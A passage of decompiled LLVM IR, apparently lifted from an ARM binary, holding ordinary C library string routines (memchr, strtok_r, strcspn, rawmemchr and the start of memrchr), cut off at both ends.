  uselistorder i32 %v0_16d0c75, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_16be4, { 1, 0 }
  uselistorder i32 %v0_16be4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_16bdc, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_16bdc, { 1, 0, 2 }
  uselistorder i32 %v0_16bdc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16d0c76, { 1, 0 }
  uselistorder i32 %v1_16bbc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_16bc4, { 1, 0 }
  uselistorder i32 %v0_16b98, { 3, 0, 1, 2 }
  uselistorder i32 %v1_16b8c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_16b78, { 1, 0, 2 }
  uselistorder i32 %v1_16b74, { 1, 0 }
  uselistorder i32 %v1_16b6c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_16b6c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_16b64, { 0, 2, 1 }
  uselistorder i32 %v3_16b64, { 3, 0, 1, 2 }
  uselistorder i1 %v0_16b64, { 1, 0 }
  uselistorder i1 %v1_16b64, { 1, 0 }
  uselistorder i32 %v3_16b60, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_16b58, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16b44, { 1, 2, 0 }
  uselistorder i32 %v1_16b3c, { 0, 2, 1 }
  uselistorder i32 %v12_16b38, { 0, 1, 3, 2 }
  uselistorder i32 %v0_16b2c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16b30, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_16b20, { 0, 2, 1 }
  uselistorder i32 %v1_16b18, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_16b18, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_16b10, { 1, 0 }
  uselistorder i32 %v1_16b08, { 2, 1, 0 }
  uselistorder i32 %v2_16b00, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_16b00, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_16afc, { 1, 0 }
  uselistorder i32 %v2_16af0, { 1, 0 }
  uselistorder i32 %v1_16af0, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_16af0, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r2.global-to-local, { 0, 68, 1, 2, 3, 4, 5, 69, 6, 7, 8, 9, 10, 70, 11, 12, 66, 67, 71, 27, 13, 15, 14, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 28, 29, 61, 30, 31, 32, 33, 34, 62, 35, 36, 37, 38, 39, 63, 40, 41, 42, 43, 44, 64, 45, 46, 47, 49, 48, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 65 }
  uselistorder i32* %r1.global-to-local, { 2, 5, 3, 77, 4, 6, 8, 10, 7, 78, 9, 11, 13, 75, 12, 79, 74, 76, 80, 83, 81, 87, 88, 14, 15, 16, 18, 17, 19, 20, 82, 21, 22, 84, 23, 85, 24, 86, 25, 26, 27, 28, 29, 31, 33, 30, 45, 32, 34, 36, 38, 35, 46, 37, 39, 41, 43, 40, 47, 42, 44, 48, 49, 54, 50, 52, 51, 53, 55, 58, 56, 59, 57, 60, 61, 67, 62, 63, 68, 64, 69, 65, 70, 66, 71, 72, 73, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 56, 3, 4, 57, 5, 6, 58, 7, 55, 61, 62, 8, 9, 21, 10, 12, 11, 13, 14, 59, 15, 16, 60, 17, 18, 19, 20, 22, 23, 31, 24, 25, 32, 26, 27, 33, 28, 29, 34, 30, 35, 36, 38, 37, 39, 40, 42, 41, 43, 44, 50, 51, 45, 46, 47, 52, 48, 49, 53, 54, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 35, 36, 37, 6, 7, 8, 9, 10, 11, 12, 13, 14, 23, 15, 16, 17, 24, 18, 19, 20, 25, 21, 22, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 46, 47, 11, 12, 13, 14, 15, 16, 17, 18, 3, 19, 20, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 44, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 2, 23, 0, 24, 1, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 49, 50, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 2, 25, 0, 26, 1, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16f60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16ef4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16e88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16e28, { 1, 0 }
  uselistorder label %.thread13, { 2, 0, 1 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_16db4, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_16d78, { 1, 0 }
  uselistorder label %dec_label_pc_16d64, { 1, 0 }
  uselistorder label %dec_label_pc_16d24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16cb8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16c4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16bec, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %dec_label_pc_16bbc, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread114, { 1, 0 }
  uselistorder label %dec_label_pc_16b58, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_16b18, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_16f84 = urem i32 %arg1, 256
  %v0_16fa0.pr = load i32, i32* @r2, align 4
  %v2_16fa015 = icmp eq i32 %v0_16fa0.pr, 0
  %v0_16fb4.pre = load i32, i32* @r0, align 4
  br i1 %v2_16fa015, label %dec_label_pc_16fb0, label %dec_label_pc_16fa8

dec_label_pc_16f8c:                               ; preds = %dec_label_pc_16fa8
  %v1_16f8c = inttoptr i32 %v0_16f9c to i8*
  %v2_16f8c = load i8, i8* %v1_16f8c, align 1
  %v3_16f8c = zext i8 %v2_16f8c to i32
  %v9_16f90 = icmp eq i32 %v3_16f8c, %v1_16f84
  br i1 %v9_16f90, label %dec_label_pc_17060, label %dec_label_pc_16f98

dec_label_pc_16f98:                               ; preds = %dec_label_pc_16f8c
  %v1_16f98 = add i32 %v0_16f98, -1
  %v1_16f9c = add i32 %v0_16f9c, 1
  %v2_16fa0 = icmp eq i32 %v1_16f98, 0
  br i1 %v2_16fa0, label %dec_label_pc_16fb0, label %dec_label_pc_16fa8

dec_label_pc_16fa8:                               ; preds = %entry, %dec_label_pc_16f98
  %v0_16f98 = phi i32 [ %v1_16f98, %dec_label_pc_16f98 ], [ %v0_16fa0.pr, %entry ]
  %v0_16f9c = phi i32 [ %v1_16f9c, %dec_label_pc_16f98 ], [ %v0_16fb4.pre, %entry ]
  %v1_16fa8 = urem i32 %v0_16f9c, 4
  %v2_16fa8 = icmp eq i32 %v1_16fa8, 0
  br i1 %v2_16fa8, label %dec_label_pc_16fb0, label %dec_label_pc_16f8c

dec_label_pc_16fb0:                               ; preds = %dec_label_pc_16f98, %dec_label_pc_16fa8, %entry
  %v0_1702c22 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_16f98 ], [ %v0_16f98, %dec_label_pc_16fa8 ]
  %v0_16fb4 = phi i32 [ %v0_16fb4.pre, %entry ], [ %v1_16f9c, %dec_label_pc_16f98 ], [ %v0_16f9c, %dec_label_pc_16fa8 ]
  %v4_16fb0 = mul nuw nsw i32 %v1_16f84, 256
  %v5_16fb0 = or i32 %v4_16fb0, %v1_16f84
  %v4_16fb8 = mul i32 %v5_16fb0, 65536
  %v5_16fb8 = or i32 %v4_16fb8, %v5_16fb0
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_1702c22, 3
  br i1 %tmp, label %dec_label_pc_16fc0, label %dec_label_pc_17054.preheader

dec_label_pc_16fc0:                               ; preds = %dec_label_pc_16fb0, %dec_label_pc_1702c.backedge
  %v0_16fdc60 = phi i32 [ %v1_16fdc, %dec_label_pc_1702c.backedge ], [ %v0_1702c22, %dec_label_pc_16fb0 ]
  %v0_1700059 = phi i32 [ %v4_16fc0, %dec_label_pc_1702c.backedge ], [ %v0_16fb4, %dec_label_pc_16fb0 ]
  %v1_16fc0 = inttoptr i32 %v0_1700059 to i32*
  %v2_16fc0 = load i32, i32* %v1_16fc0, align 4
  %v4_16fc0 = add i32 %v0_1700059, 4
  %v2_16fc4 = xor i32 %v2_16fc0, %v5_16fb8
  %v2_16fc8 = add i32 %v2_16fc4, 2130640639
  %v1_16fcc = sub i32 -1, %v2_16fc4
  %v2_16fd0 = xor i32 %v2_16fc8, %v1_16fcc
  %v2_16fd4 = and i32 %v2_16fd0, -2130640640
  %v2_16fd8 = icmp eq i32 %v2_16fd4, 0
  %v1_16fdc = add i32 %v0_16fdc60, -4
  br i1 %v2_16fd8, label %dec_label_pc_1702c.backedge, label %dec_label_pc_16fe4

dec_label_pc_1702c.backedge:                      ; preds = %dec_label_pc_16fc0, %dec_label_pc_1701c
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_16fdc, 3
  br i1 %tmp73, label %dec_label_pc_16fc0, label %dec_label_pc_17054.preheader

dec_label_pc_16fe4:                               ; preds = %dec_label_pc_16fc0
  %v2_16fe4 = inttoptr i32 %v0_1700059 to i8*
  %v3_16fe4 = load i8, i8* %v2_16fe4, align 1
  %v4_16fe4 = zext i8 %v3_16fe4 to i32
  %v9_16fec = icmp eq i32 %v4_16fe4, %v1_16f84
  %v1_16ff0 = add i32 %v0_1700059, 3
  store i32 %v1_16ff0, i32* @ip, align 4
  br i1 %v9_16fec, label %dec_label_pc_17060, label %dec_label_pc_16ff8

dec_label_pc_16ff8:                               ; preds = %dec_label_pc_16fe4
  %v1_16ff8 = add i32 %v0_1700059, 1
  %v2_16ff8 = inttoptr i32 %v1_16ff8 to i8*
  %v3_16ff8 = load i8, i8* %v2_16ff8, align 1
  %v4_16ff8 = zext i8 %v3_16ff8 to i32
  %v9_16ffc = icmp eq i32 %v4_16ff8, %v1_16f84
  br i1 %v9_16ffc, label %bb, label %dec_label_pc_1700c

bb:                                               ; preds = %dec_label_pc_16ff8
  br label %dec_label_pc_17060

dec_label_pc_1700c:                               ; preds = %dec_label_pc_16ff8
  %v1_1700c = add i32 %v0_1700059, 2
  %v2_1700c = inttoptr i32 %v1_1700c to i8*
  %v3_1700c = load i8, i8* %v2_1700c, align 1
  %v4_1700c = zext i8 %v3_1700c to i32
  %v9_17010 = icmp eq i32 %v4_1700c, %v1_16f84
  br i1 %v9_17010, label %dec_label_pc_17060, label %dec_label_pc_1701c

dec_label_pc_1701c:                               ; preds = %dec_label_pc_1700c
  %v2_1701c = inttoptr i32 %v1_16ff0 to i8*
  %v3_1701c = load i8, i8* %v2_1701c, align 1
  %v4_1701c = zext i8 %v3_1701c to i32
  %v9_17020 = icmp eq i32 %v4_1701c, %v1_16f84
  br i1 %v9_17020, label %bb36, label %dec_label_pc_1702c.backedge

bb36:                                             ; preds = %dec_label_pc_1701c
  br label %dec_label_pc_17060

dec_label_pc_17054.preheader:                     ; preds = %dec_label_pc_1702c.backedge, %dec_label_pc_16fb0
  %v0_17000.lcssa = phi i32 [ %v0_16fb4, %dec_label_pc_16fb0 ], [ %v4_16fc0, %dec_label_pc_1702c.backedge ]
  %v0_16fdc.lcssa = phi i32 [ %v0_1702c22, %dec_label_pc_16fb0 ], [ %v1_16fdc, %dec_label_pc_1702c.backedge ]
  %v2_170547 = icmp eq i32 %v0_16fdc.lcssa, 0
  br i1 %v2_170547, label %dec_label_pc_1705c, label %dec_label_pc_17044

dec_label_pc_17044:                               ; preds = %dec_label_pc_17050, %dec_label_pc_17054.preheader
  %v0_17054.in = phi i32 [ %v0_17054, %dec_label_pc_17050 ], [ %v0_16fdc.lcssa, %dec_label_pc_17054.preheader ]
  %v0_17050 = phi i32 [ %v1_17050, %dec_label_pc_17050 ], [ %v0_17000.lcssa, %dec_label_pc_17054.preheader ]
  %v0_17054 = add i32 %v0_17054.in, -1
  %v1_17044 = inttoptr i32 %v0_17050 to i8*
  %v2_17044 = load i8, i8* %v1_17044, align 1
  %v3_17044 = zext i8 %v2_17044 to i32
  %v9_17048 = icmp eq i32 %v3_17044, %v1_16f84
  br i1 %v9_17048, label %dec_label_pc_17060, label %dec_label_pc_17050

dec_label_pc_17050:                               ; preds = %dec_label_pc_17044
  %v1_17050 = add i32 %v0_17050, 1
  %v2_17054 = icmp eq i32 %v0_17054, 0
  br i1 %v2_17054, label %dec_label_pc_1705c, label %dec_label_pc_17044

dec_label_pc_1705c:                               ; preds = %dec_label_pc_17050, %dec_label_pc_17054.preheader
  br label %dec_label_pc_17060

dec_label_pc_17060:                               ; preds = %dec_label_pc_16f8c, %dec_label_pc_1700c, %dec_label_pc_16fe4, %dec_label_pc_17044, %bb36, %bb, %dec_label_pc_1705c
  %v1_17064 = phi i32 [ 0, %dec_label_pc_1705c ], [ %v1_16ff8, %bb ], [ %v1_16ff0, %bb36 ], [ %v0_17050, %dec_label_pc_17044 ], [ %v1_1700c, %dec_label_pc_1700c ], [ %v0_1700059, %dec_label_pc_16fe4 ], [ %v0_16f9c, %dec_label_pc_16f8c ]
  ret i32 %v1_17064

; uselistorder directives
  uselistorder i32 %v1_16fdc, { 1, 0, 2 }
  uselistorder i32 %v0_1700059, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_16fb0, { 1, 0 }
  uselistorder i32 %v0_1702c22, { 1, 2, 0 }
  uselistorder i32 %v0_16f9c, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_16fb4.pre, { 1, 0 }
  uselistorder i32 %v1_16f84, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder label %dec_label_pc_17060, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_1702c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_16fc0, { 1, 0 }
  uselistorder label %dec_label_pc_16fb0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16fa8, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17070 = load i32, i32* @r4, align 4
  store i32 %v3_17070, i32* %stack_var_-16, align 4
  %v0_17074 = load i32, i32* @r0, align 4
  store i32 %v0_17074, i32* %r4.global-to-local, align 4
  %v2_17074 = icmp eq i32 %v0_17074, 0
  %v1_17078 = load i32, i32* @r2, align 4
  br i1 %v2_17074, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_17078 = inttoptr i32 %v1_17078 to i32*
  %v3_17078 = load i32, i32* %v2_17078, align 4
  store i32 %v3_17078, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_1707c = phi i32 [ %v3_17078, %bb ], [ %v0_17074, %entry ]
  store i32 %v0_1707c, i32* @r0, align 4
  store i32 %v1_17078, i32* %r5.global-to-local, align 4
  %v0_17084 = load i32, i32* @r1, align 4
  store i32 %v0_17084, i32* %r6.global-to-local, align 4
  %v1_17088 = inttoptr i32 %v0_1707c to i8*
  %v2_17088 = call i32 @__GI_strspn(i8* %v1_17088)
  %v0_1708c = load i32, i32* %r4.global-to-local, align 4
  %v2_1708c = add i32 %v0_1708c, %v2_17088
  %v3_1708c = inttoptr i32 %v2_1708c to i8*
  %v4_1708c = load i8, i8* %v3_1708c, align 1
  %v6_1708c = zext i8 %v4_1708c to i32
  store i32 %v6_1708c, i32* %r3.global-to-local, align 4
  store i32 %v2_1708c, i32* @r4, align 4
  %v2_17094 = icmp eq i8 %v4_1708c, 0
  br i1 %v2_17094, label %bb8, label %dec_label_pc_170a0

bb8:                                              ; preds = %entry._crit_edge
  %v2_17098 = load i32, i32* %r5.global-to-local, align 4
  %v3_17098 = inttoptr i32 %v2_17098 to i32*
  store i32 %v2_1708c, i32* %v3_17098, align 4
  br label %dec_label_pc_170dc

dec_label_pc_170a0:                               ; preds = %entry._crit_edge
  %v0_170a0 = load i32, i32* %r6.global-to-local, align 4
  %v3_170a8 = call i32 @__GI_strpbrk(i8* %v3_1708c, i32 %v0_170a0)
  %v3_170ac = icmp eq i32 %v3_170a8, 0
  br i1 %v3_170ac, label %dec_label_pc_170b4, label %dec_label_pc_170cc

dec_label_pc_170b4:                               ; preds = %dec_label_pc_170a0
  %v0_170b8 = load i32, i32* @r4, align 4
  store i32 %v0_170b8, i32* @r0, align 4
  %v2_170bc = call i32 @rawmemchr(i32 %v0_170b8, i32 0)
  %v0_170c0 = load i32, i32* @r4, align 4
  store i32 %v0_170c0, i32* %r3.global-to-local, align 4
  %v1_170c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_170c4 = inttoptr i32 %v1_170c4 to i32*
  store i32 %v2_170bc, i32* %v2_170c4, align 4
  br label %dec_label_pc_170dc

dec_label_pc_170cc:                               ; preds = %dec_label_pc_170a0
  %v4_170a8 = inttoptr i32 %v3_170a8 to i8*
  store i8 0, i8* %v4_170a8, align 1
  %v7_170d0 = add i32 %v3_170a8, 1
  %v1_170d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_170d4 = inttoptr i32 %v1_170d4 to i32*
  store i32 %v7_170d0, i32* %v2_170d4, align 4
  %v0_170d8 = load i32, i32* @r4, align 4
  store i32 %v0_170d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_170dc

dec_label_pc_170dc:                               ; preds = %bb8, %dec_label_pc_170b4, %dec_label_pc_170cc
  %v0_170dc = load i32, i32* %r3.global-to-local, align 4
  %v2_170e0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_170e0, i32* @r4, align 4
  ret i32 %v0_170dc

; uselistorder directives
  uselistorder i32 %v3_170a8, { 0, 2, 1 }
  uselistorder i32 %v0_1707c, { 1, 0 }
  uselistorder i32 %v0_17074, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_170dc, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_170e8 = load i32, i32* @r4, align 4
  store i32 %v3_170e8, i32* %stack_var_-16, align 4
  %v6_170e8 = load i32, i32* @r5, align 4
  %v9_170e8 = load i32, i32* @r6, align 4
  %v0_170ec = load i32, i32* @r0, align 4
  %v0_170f0 = load i32, i32* @r1, align 4
  store i32 %v0_170f0, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_1710c8 = inttoptr i32 %v0_170ec to i8*
  %v2_1710c9 = load i8, i8* %v1_1710c8, align 1
  %v2_1711011 = icmp eq i8 %v2_1710c9, 0
  store i32 %v0_170f0, i32* @r0, align 4
  %v1_1711812 = add i32 %v0_170ec, 1
  store i32 %v1_1711812, i32* @r4, align 4
  br i1 %v2_1711011, label %dec_label_pc_17120, label %dec_label_pc_170fc

dec_label_pc_170fc:                               ; preds = %entry, %dec_label_pc_17108
  %v3_1710c14.in = phi i8 [ %v2_1710c, %dec_label_pc_17108 ], [ %v2_1710c9, %entry ]
  %v0_1711413 = phi i32 [ %v0_17114.pre, %dec_label_pc_17108 ], [ %v0_170f0, %entry ]
  %v3_1710c14 = zext i8 %v3_1710c14.in to i32
  %v2_170fc = call i32 @__GI_strchr(i32 %v0_1711413, i32 %v3_1710c14)
  %v2_17100 = icmp eq i32 %v2_170fc, 0
  %v0_17108 = load i32, i32* @r5, align 4
  br i1 %v2_17100, label %dec_label_pc_17108, label %dec_label_pc_17120

dec_label_pc_17108:                               ; preds = %dec_label_pc_170fc
  %v1_17108 = add i32 %v0_17108, 1
  %v0_1710c.pre = load i32, i32* @r4, align 4
  %v0_17114.pre = load i32, i32* @r6, align 4
  store i32 %v1_17108, i32* @r5, align 4
  %v1_1710c = inttoptr i32 %v0_1710c.pre to i8*
  %v2_1710c = load i8, i8* %v1_1710c, align 1
  %v2_17110 = icmp eq i8 %v2_1710c, 0
  store i32 %v0_17114.pre, i32* @r0, align 4
  %v1_17118 = add i32 %v0_1710c.pre, 1
  store i32 %v1_17118, i32* @r4, align 4
  br i1 %v2_17110, label %dec_label_pc_17120, label %dec_label_pc_170fc

dec_label_pc_17120:                               ; preds = %dec_label_pc_17108, %dec_label_pc_170fc, %entry
  %v0_17120 = phi i32 [ 0, %entry ], [ %v0_17108, %dec_label_pc_170fc ], [ %v1_17108, %dec_label_pc_17108 ]
  %v2_17124 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17124, i32* @r4, align 4
  store i32 %v6_170e8, i32* @r5, align 4
  store i32 %v9_170e8, i32* @r6, align 4
  ret i32 %v0_17120

; uselistorder directives
  uselistorder i8 %v2_1710c, { 1, 0 }
  uselistorder i32 %v0_17114.pre, { 1, 0 }
  uselistorder i32 %v0_1710c.pre, { 1, 0 }
  uselistorder label %dec_label_pc_170fc, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_17130 = urem i32 %arg1, 256
  %v0_171482 = load i32, i32* @r0, align 4
  %v1_171483 = urem i32 %v0_171482, 4
  %v2_171484 = icmp eq i32 %v1_171483, 0
  br i1 %v2_171484, label %dec_label_pc_17150, label %dec_label_pc_17138

dec_label_pc_17138:                               ; preds = %entry, %dec_label_pc_17144
  %v0_17144 = phi i32 [ %v1_17144, %dec_label_pc_17144 ], [ %v0_171482, %entry ]
  %v1_17138 = inttoptr i32 %v0_17144 to i8*
  %v2_17138 = load i8, i8* %v1_17138, align 1
  %v3_17138 = zext i8 %v2_17138 to i32
  %v9_1713c = icmp eq i32 %v3_17138, %v1_17130
  br i1 %v9_1713c, label %dec_label_pc_171cc, label %dec_label_pc_17144

dec_label_pc_17144:                               ; preds = %dec_label_pc_17138
  %v1_17144 = add i32 %v0_17144, 1
  %v1_17148 = urem i32 %v1_17144, 4
  %v2_17148 = icmp eq i32 %v1_17148, 0
  br i1 %v2_17148, label %dec_label_pc_17150, label %dec_label_pc_17138

dec_label_pc_17150:                               ; preds = %dec_label_pc_17144, %entry
  %v0_17154 = phi i32 [ %v0_171482, %entry ], [ %v1_17144, %dec_label_pc_17144 ]
  %v4_17150 = mul nuw nsw i32 %v1_17130, 256
  %v5_17150 = or i32 %v4_17150, %v1_17130
  %v4_17158 = mul i32 %v5_17150, 65536
  %v5_17158 = or i32 %v4_17158, %v5_17150
  br label %dec_label_pc_1715c

dec_label_pc_1715c:                               ; preds = %dec_label_pc_171bc, %dec_label_pc_1715c, %dec_label_pc_17150
  %v0_171a0 = phi i32 [ %v0_17154, %dec_label_pc_17150 ], [ %v4_1715c, %dec_label_pc_1715c ], [ %v4_1715c, %dec_label_pc_171bc ]
  %v1_1715c = inttoptr i32 %v0_171a0 to i32*
  %v2_1715c = load i32, i32* %v1_1715c, align 4
  %v4_1715c = add i32 %v0_171a0, 4
  %v2_17164 = xor i32 %v2_1715c, %v5_17158
  %v2_17168 = add i32 %v2_17164, 2130640639
  %v1_17170 = sub i32 -1, %v2_17164
  %v2_17174 = xor i32 %v2_17168, %v1_17170
  %v2_17178 = and i32 %v2_17174, -2130640640
  %v2_1717c = icmp eq i32 %v2_17178, 0
  br i1 %v2_1717c, label %dec_label_pc_1715c, label %dec_label_pc_17184

dec_label_pc_17184:                               ; preds = %dec_label_pc_1715c
  %v2_17184 = inttoptr i32 %v0_171a0 to i8*
  %v3_17184 = load i8, i8* %v2_17184, align 1
  %v4_17184 = zext i8 %v3_17184 to i32
  %v9_1718c = icmp eq i32 %v4_17184, %v1_17130
  %v1_17190 = add i32 %v0_171a0, 3
  br i1 %v9_1718c, label %dec_label_pc_171cc, label %dec_label_pc_17198

dec_label_pc_17198:                               ; preds = %dec_label_pc_17184
  %v1_17198 = add i32 %v0_171a0, 1
  %v2_17198 = inttoptr i32 %v1_17198 to i8*
  %v3_17198 = load i8, i8* %v2_17198, align 1
  %v4_17198 = zext i8 %v3_17198 to i32
  %v9_1719c = icmp eq i32 %v4_17198, %v1_17130
  br i1 %v9_1719c, label %bb, label %dec_label_pc_171ac

bb:                                               ; preds = %dec_label_pc_17198
  br label %dec_label_pc_171cc

dec_label_pc_171ac:                               ; preds = %dec_label_pc_17198
  %v1_171ac = add i32 %v0_171a0, 2
  %v2_171ac = inttoptr i32 %v1_171ac to i8*
  %v3_171ac = load i8, i8* %v2_171ac, align 1
  %v4_171ac = zext i8 %v3_171ac to i32
  %v9_171b0 = icmp eq i32 %v4_171ac, %v1_17130
  br i1 %v9_171b0, label %dec_label_pc_171cc, label %dec_label_pc_171bc

dec_label_pc_171bc:                               ; preds = %dec_label_pc_171ac
  %v2_171bc = inttoptr i32 %v1_17190 to i8*
  %v3_171bc = load i8, i8* %v2_171bc, align 1
  %v4_171bc = zext i8 %v3_171bc to i32
  %v9_171c0 = icmp eq i32 %v4_171bc, %v1_17130
  br i1 %v9_171c0, label %dec_label_pc_171c8, label %dec_label_pc_1715c

dec_label_pc_171c8:                               ; preds = %dec_label_pc_171bc
  br label %dec_label_pc_171cc

dec_label_pc_171cc:                               ; preds = %dec_label_pc_17138, %dec_label_pc_171ac, %dec_label_pc_17184, %bb, %dec_label_pc_171c8
  %v1_171d0 = phi i32 [ %v1_17190, %dec_label_pc_171c8 ], [ %v1_17198, %bb ], [ %v1_171ac, %dec_label_pc_171ac ], [ %v0_171a0, %dec_label_pc_17184 ], [ %v0_17144, %dec_label_pc_17138 ]
  ret i32 %v1_171d0

; uselistorder directives
  uselistorder i32 %v4_1715c, { 1, 0 }
  uselistorder i32 %v0_171a0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_17150, { 1, 0 }
  uselistorder i32 %v1_17144, { 1, 0, 2 }
  uselistorder i32 %v0_171482, { 2, 1, 0 }
  uselistorder i32 %v1_17130, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_171cc, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_17138, { 1, 0 }
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_171e0 = urem i32 %arg2, 256
  %v2_171e4 = add i32 %arg3, %arg1
  %v2_171fc4 = icmp eq i32 %arg3, 0
  br i1 %v2_171fc4, label %dec_label_pc_1720c, label %dec_label_pc_17204

dec_label_pc_171ec:                               ; preds = %dec_label_pc_17204
  %v1_171ec = add i32 %v0_171ec, -1
  %v2_171ec = inttoptr i32 %v1_171ec to i8*
  %v3_171ec = load i8, i8* %v2_171ec, align 1
  %v4_171ec = zext i8 %v3_171ec to i32
  %v9_171f0 = icmp eq i32 %v4_171ec, %v1_171e0
  br i1 %v9_171f0, label %dec_label_pc_172ac, label %dec_label_pc_171f8

dec_label_pc_171f8:                               ; preds = %dec_label_pc_171ec
  %v1_171f8 = add i32 %v0_171f8, -1
  %v2_171fc = icmp eq i32 %v1_171f8, 0
  br i1 %v2_171fc, label %dec_label_pc_1720c, label %dec_label_pc_17204

dec_label_pc_17204:                               ; preds = %entry, %dec_label_pc_171f8
  %v0_171f8 = phi i32 [ %v1_171f8, %dec_label_pc_171f8 ], [ %arg3, %entry ]
  %v0_171ec = phi i32 [ %v1_171ec, %dec_label_pc_171f8 ], [ %v2_171e4, %entry ]
  %v1_17204 = urem i32 %v0_171ec, 4
  %v2_17204 = icmp eq i32 %v1_17204, 0
  br i1 %v2_17204, label %dec_label_pc_1720c, label %dec_label_pc_171ec

